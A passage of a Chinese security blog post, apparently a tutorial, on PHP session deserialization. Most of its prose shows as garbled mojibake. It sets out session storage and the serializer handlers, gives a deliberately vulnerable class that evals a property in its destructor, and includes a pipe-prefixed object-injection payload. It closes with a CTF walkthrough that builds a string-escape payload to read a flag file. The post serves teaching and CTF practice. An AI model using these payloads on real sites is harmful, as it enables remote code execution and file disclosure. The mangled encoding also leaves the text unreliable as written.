invoke__">Seesion_start</span>()å‡½æ•°ä¼šåˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„Session IDï¼Œå¹¶è‡ªåŠ¨é€šè¿‡HTTPçš„å“åº”å¤´ï¼Œå°†è¿™ä¸ªSession IDä¿å­˜åˆ°å®¢æˆ·ç«¯Cookieä¸­ã€‚åŒæ—¶ï¼Œä¹Ÿåœ¨æœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ªä»¥Session IDå‘½åçš„æ–‡ä»¶ï¼Œç”¨äºä¿å­˜è¿™ä¸ªç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚å½“åŒä¸€ä¸ªç”¨æˆ·å†æ¬¡è®¿é—®è¿™ä¸ªç½‘ç«™æ—¶ï¼Œä¹Ÿä¼šè‡ªåŠ¨é€šè¿‡HTTPçš„è¯·æ±‚å¤´å°†Cookieä¸­ä¿å­˜çš„Seesion IDå†æºå¸¦è¿‡æ¥ï¼Œè¿™æ—¶<span class="title function_ invoke__">Session_start</span>()å‡½æ•°å°±ä¸ä¼šå†å»åˆ†é…ä¸€ä¸ªæ–°çš„Session IDï¼Œè€Œæ˜¯åœ¨æœåŠ¡å™¨çš„ç¡¬ç›˜ä¸­å»å¯»æ‰¾å’Œè¿™ä¸ªSession IDåŒåçš„Sessionæ–‡ä»¶ï¼Œå°†è¿™ä¹‹å‰ä¸ºè¿™ä¸ªç”¨æˆ·ä¿å­˜çš„ä¼šè¯ä¿¡æ¯è¯»å‡ºï¼Œåœ¨å½“å‰è„šæœ¬ä¸­åº”ç”¨ï¼Œè¾¾åˆ°è·Ÿè¸ªè¿™ä¸ªç”¨æˆ·çš„ç›®çš„</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161517719.png" alt="img"></p><h2 id="SESSIONçš„å­˜å‚¨æœºåˆ¶"><a href="#SESSIONçš„å­˜å‚¨æœºåˆ¶" class="headerlink" title="SESSIONçš„å­˜å‚¨æœºåˆ¶"></a>SESSIONçš„å­˜å‚¨æœºåˆ¶</h2><p>å†™ä¸€ä¸ªæµ‹è¯•ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;session_id(): &quot;</span>.<span class="title function_ invoke__">session_id</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;COOKIE: &quot;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&quot;PHPSESSID&quot;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161531721.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°ç”Ÿæˆäº†ä¸€ä¸ªsession</p><p>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶å¤¹ï¼Œä¸€èˆ¬éƒ½åœ¨æ˜¯å­˜å‚¨åœ¨tmp&#x2F;é‡Œé¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php5/sess_PHPSESSID</span><br><span class="line">/var/lib/php7/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSED</span><br><span class="line">liunxå¸¸è§ä¿å­˜ä½ç½®</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161533665.png" alt="img"></p><p>æœ€åä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬åˆšåˆ›å»ºçš„sessionäº†</p><p>æˆ‘ä»¬ç»™sessionèµ‹å€¼çœ‹çœ‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;test1&#x27;</span>]=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;test2&#x27;</span>]=<span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;session_id(): &quot;</span> . <span class="title function_ invoke__">session_id</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;COOKIE: &quot;</span> . <span class="variable">$_COOKIE</span>[<span class="string">&quot;PHPSESSID&quot;</span>];</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161544088.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°æ•°æ®æ˜¯ä»¥åºåˆ—åŒ–çš„çŠ¶æ€å­˜å‚¨åœ¨æ–‡ä»¶ä¸­çš„</p><p>é‚£å°±æ˜¯HTTPè¯·æ±‚ä¸€ä¸ªé¡µé¢åï¼Œå¦‚æœç”¨åˆ°å¼€å¯sessionï¼Œä¼šå»è¯»COOKIEä¸­çš„PHPSESSIDæ˜¯å¦æœ‰ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™ä¼šæ–°ç”Ÿæˆä¸€ä¸ªsession_idï¼Œå…ˆå­˜å…¥COOKIEä¸­çš„PHPSESSIDä¸­ï¼Œå†ç”Ÿæˆä¸€ä¸ªsess_å‰ç¼€æ–‡ä»¶ã€‚å½“æœ‰å†™å…¥$_SESSIONçš„æ—¶å€™ï¼Œå°±ä¼šå¾€sess_æ–‡ä»¶é‡Œåºåˆ—åŒ–å†™å…¥æ•°æ®ã€‚å½“è¯»å–åˆ°sessionå˜é‡çš„æ—¶å€™ï¼Œå…ˆä¼šè¯»å–COOKIEä¸­çš„PHPSESSIDï¼Œè·å¾—session_idï¼Œç„¶åå†å»æ‰¾è¿™ä¸ªsess_session_idæ–‡ä»¶ï¼Œæ¥è·å–å¯¹åº”çš„æ•°æ®ã€‚ç”±äºé»˜è®¤çš„PHPSESSIDæ˜¯ä¸´æ—¶çš„ä¼šè¯ï¼Œåœ¨æµè§ˆå™¨å…³é—­åå°±ä¼šæ¶ˆå¤±ï¼Œæ‰€ä»¥ï¼Œå½“æˆ‘ä»¬æ‰“å¼€æµè§ˆå™¨é‡æ–°è®¿é—®çš„æ—¶å€™ï¼Œå°±ä¼šæ–°ç”Ÿæˆsession_idå’Œsess_session_idè¿™ä¸ªæ–‡ä»¶ã€‚</p><h2 id="SESSIONæ¨¡å—çš„å‚æ•°å«ä¹‰"><a href="#SESSIONæ¨¡å—çš„å‚æ•°å«ä¹‰" class="headerlink" title="SESSIONæ¨¡å—çš„å‚æ•°å«ä¹‰"></a>SESSIONæ¨¡å—çš„å‚æ•°å«ä¹‰</h2><table><thead><tr><th align="center"><strong>Directive</strong></th><th align="center"><strong>å«ä¹‰</strong></th></tr></thead><tbody><tr><td align="center">session.save_handler</td><td align="center">sessionä¿å­˜å½¢å¼ã€‚é»˜è®¤ä¸ºfiles</td></tr><tr><td align="center">session.save_path</td><td align="center">sessionä¿å­˜è·¯å¾„ã€‚</td></tr><tr><td align="center">session.serialize_handler</td><td align="center">sessionåºåˆ—åŒ–å­˜å‚¨æ‰€ç”¨å¤„ç†å™¨ã€‚é»˜è®¤ä¸ºphpã€‚</td></tr><tr><td align="center">session.upload_progress.cleanup</td><td align="center">ä¸€æ—¦è¯»å–äº†æ‰€æœ‰POSTæ•°æ®ï¼Œç«‹å³æ¸…é™¤è¿›åº¦ä¿¡æ¯ã€‚é»˜è®¤å¼€å¯</td></tr><tr><td align="center">session.upload_progress.enabled</td><td align="center">å°†ä¸Šä¼ æ–‡ä»¶çš„è¿›åº¦ä¿¡æ¯å­˜åœ¨sessionä¸­ã€‚é»˜è®¤å¼€å¯ã€‚</td></tr></tbody></table><p>ä¸»è¦æœ‰ä¸‰ç§å¤„ç†å™¨</p><p>å½“ <strong>session.serialize_handler&#x3D;php</strong> æ—¶ï¼Œsessionæ–‡ä»¶å†…å®¹ä¸ºï¼š <code>name|s:7:&quot;mochazz&quot;;</code></p><p>å½“ <strong>session.serialize_handler&#x3D;php_serialize</strong> æ—¶ï¼Œsessionæ–‡ä»¶ä¸ºï¼š <code>a:1:&#123;s:4:&quot;name&quot;;s:7:&quot;mochazz&quot;;&#125;</code></p><p>å½“ <strong>session.serialize_handler&#x3D;php_binary</strong> æ—¶ï¼Œsessionæ–‡ä»¶å†…å®¹ä¸ºï¼š <code>äºŒè¿›åˆ¶å­—ç¬¦names:7:&quot;mochazz&quot;;</code></p><p>å¯ä»¥ç”¨ini_setæ¥æ”¹å˜å¤„ç†å™¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å½“ <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled">session.upload_progress.enabled</a> INI é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚ è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€ã€‚</p><p>å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>åŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>ä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>ä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a> ä¸ <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>è¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚</p><h2 id="SESSIONçš„ååºåˆ—åŒ–"><a href="#SESSIONçš„ååºåˆ—åŒ–" class="headerlink" title="SESSIONçš„ååºåˆ—åŒ–"></a>SESSIONçš„ååºåˆ—åŒ–</h2><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161556577.png" alt="img"></p><p>è¿™ä¹Ÿå°±æ˜¯SESSIONååºåˆ—åŒ–çš„åˆ‡å…¥ç‚¹äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡å†™å…¥SESSIONæ–‡ä»¶ï¼Œç„¶åè¯·æ±‚é¡µé¢ï¼Œè®©phpè‡ªè¡Œå°†æˆ‘ä»¬çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ˜¯é”®å€¼å¯¹ï¼Œé‚£ä¹ˆ<code>session</code>åºåˆ—åŒ–å­˜å‚¨æ‰€ç”¨çš„å¤„ç†å™¨è‚¯å®šä¹Ÿæ˜¯å°†è¿™ä¸ªé”®å€¼å¯¹å†™äº†è¿›å»ï¼Œæ€ä¹ˆæ‰èƒ½è®©å®ƒæ­£å¥½ååºåˆ—åŒ–åˆ°æˆ‘ä»¬ä¼ å…¥çš„å†…å®¹ã€‚</p><p>è¿™é‡Œå°±è¦ç”¨åˆ°æˆ‘ä»¬ä¸Šé¢ä»‹ç»åˆ°çš„ä¸åŒåºåˆ—åŒ–å¤„ç†å™¨çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æˆ‘ä»¬ä¼ å…¥çš„åºåˆ—åŒ–å†…å®¹å‰é¢åŠ ä¸€ä¸ª|,åœ¨php_serializeå¤„ç†åä¼šè¿”å›ä¸€ä¸ªåºåˆ—åŒ–åçš„æ•°ç»„ï¼Œä½†æ˜¯åœ¨ä½¿ç”¨phpå¤„ç†å™¨ä¼šä»¥ç«–çº¿|ä½œä¸ºä¸€ä¸ªåˆ†éš”ç¬¦ï¼Œå‰é¢çš„ä¸ºé”®åï¼Œåé¢çš„ä¸ºé”®å€¼ï¼Œç„¶åå°†é”®å€¼è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œè¿™æ ·å°±èƒ½å¤Ÿå®ç°æˆ‘ä»¬sessionååºåˆ—åŒ–æ“ä½œã€‚</p><h3 id="ç¤ºä¾‹-3"><a href="#ç¤ºä¾‹-3" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;test&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">?test=|O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="å°è¯•ç‰›åˆ€â€”-å®‰æ´µæ¯-2019-easy-serialize-phpï¼ˆsessionååºåˆ—åŒ–-å‡é€ƒé€¸ï¼‰"><a href="#å°è¯•ç‰›åˆ€â€”-å®‰æ´µæ¯-2019-easy-serialize-phpï¼ˆsessionååºåˆ—åŒ–-å‡é€ƒé€¸ï¼‰" class="headerlink" title="å°è¯•ç‰›åˆ€â€”-[å®‰æ´µæ¯ 2019]easy_serialize_phpï¼ˆsessionååºåˆ—åŒ–+å‡é€ƒé€¸ï¼‰"></a>å°è¯•ç‰›åˆ€â€”-[å®‰æ´µæ¯ 2019]easy_serialize_phpï¼ˆsessionååºåˆ—åŒ–+å‡é€ƒé€¸ï¼‰</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161622229.png" alt="img"></p><p>ä¼ å…¥phpinfoçœ‹ä¸€ä¸‹</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161724600.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œååºåˆ—åŒ–å¤„ç†å™¨æ˜¯phpï¼Œæ–‡ä»¶æç¤ºï¼Œd0g3_f1ag.php</p><p>é‚£ä¹ˆçœ‹ä»£ç å¯ä»¥çŸ¥é“ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰§è¡Œ<code>file_get_contents(base64_decode($userinfo[&#39;img&#39;]))</code>è¿™ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”ä¸€çœ‹å°±çŸ¥é“è¿˜æ˜¯å­—ç¬¦ä¸²å‡å°‘çš„å­—ç¬¦ä¸²é€ƒé€¸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">çœ‹ä»£ç ï¼Œéœ€è¦æ»¡è¶³f=show_image,è®©å­—ç¬¦ä¸²é€ƒé€¸</span><br><span class="line">åŸå§‹å­—ç¬¦ä¸²ä¸º</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">åºåˆ—åŒ–ä¸€ä¸‹çœ‹çœ‹</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&#x27;show_image&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">a:<span class="number">3</span>ï¼š&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;show_image&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br><span class="line">ç°åœ¨è¦æŠŠimgç»™å¼„æˆZDBnM19mMWFnLnBocA==ï¼ˆd0g3_flag.phpçš„base64ç¼–ç ï¼‰</span><br><span class="line">ä»userä¸‹æ‰‹ï¼ŒæŠŠguest<span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;show_imageç»™åæ‰ï¼Œç„¶åè‡ªå·±å†é€ ä¸ªé”®å€¼å¯¹</span></span><br><span class="line"><span class="string">å³</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"><span class="subst">$_SESSION</span>[&quot;</span>user<span class="string">&quot;] = &#x27;flagflagflagflagflagflag&#x27;;</span></span><br><span class="line"><span class="string"><span class="subst">$_SESSION</span>[&#x27;function&#x27;] = &#x27;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">$_SESSION[&#x27;</span>dd<span class="string">&#x27;] = base64_encode(&#x27;</span>d0g3_f1ag.php<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">echo serialize($_SESSION);</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:79:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:2:&quot;dd&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h2><p><a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0Dg7=YqBK0QD/iW4nrBeIe0K=Qx">å¸¦ä½ èµ°è¿›PHP sessionååºåˆ—åŒ–æ¼æ´</a></p><p><a href="https://www.cnblogs.com/GTL-JU/p/16859098.html">sessionååºåˆ—åŒ–</a></p><p><a 